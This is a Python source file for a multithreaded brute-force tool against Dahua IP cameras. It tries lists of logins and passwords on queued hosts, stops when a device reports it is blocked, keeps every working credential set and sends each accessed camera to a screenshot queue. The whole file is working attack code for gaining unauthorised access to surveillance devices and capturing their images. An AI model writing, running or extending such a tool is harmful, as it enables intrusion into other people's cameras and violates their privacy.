import threading
import logging
import config

from dahua import *

#from wrapt_timeout_decorator import *


class BruteThread(threading.Thread):
    def __init__(self, brute_queue, screenshot_queue):
        threading.Thread.__init__(self)
        self.brute_queue = brute_queue
        self.screenshot_queue = screenshot_queue

    def run(self):
        while True:
            with threading.Lock():
                host = self.brute_queue.get()
            self.dahua_auth(host)
            self.brute_queue.task_done()


    def dahua_login(self, server_ip, port, login, password):
        with threading.Lock():
            config.update_status()
#            logging.info(f'[{config.state}%] Total bruted {len(config.working_hosts)} devices')
            logging.debug('Login attempt: %s with %s:%s' % (server_ip, login, password))
        dahua = DahuaController(server_ip, port, login, password)
        if dahua.status == 0:
            logging.debug(f'Success login: {server_ip} with {login}:{password}')
            return dahua
        elif dahua.status == 2:
            logging.debug('Blocked camera: %s:%s' % (server_ip, port))
            return "Blocked"
        else:
            logging.debug('Unable to login: %s:%s with %s:%s' % (server_ip, port, login, password))
            return None


    def dahua_auth(self, host):
        server_ip = host[0]
        port = int(host[1])
        if config.logopasses:
#            anti_block = 0
            for logopass in config.logopasses:
                password = logopass[1]
                login = logopass[0]
                try:
                    res = self.dahua_login(server_ip, port, login, password)
#                    anti_block += 1
                    if res == "Blocked": #or anti_block > 4:
                        break
                    elif res:
                        config.working_hosts.append([res.ip, res.port, res.login, res.password, res])
                        self.screenshot_queue.put(res)
                        return
                except Exception as e:
                    logging.debug('Connection error: %s:%s - %s' % (server_ip, port, str(e)))
        else:
            for login in config.logins:
                for password in config.passwords:
                    try:
                        res = self.dahua_login(server_ip, port, login, password)
                        if res == "Blocked":
                            break
                        elif res:
                            config.working_hosts.append([res.ip, res.port, res.login, res.password, res])
                            self.screenshot_queue.put(res)
                            return
                    except Exception as e:
                        logging.debug('Connection error: %s:%s - %s' % (server_ip, port, str(e)))
        return
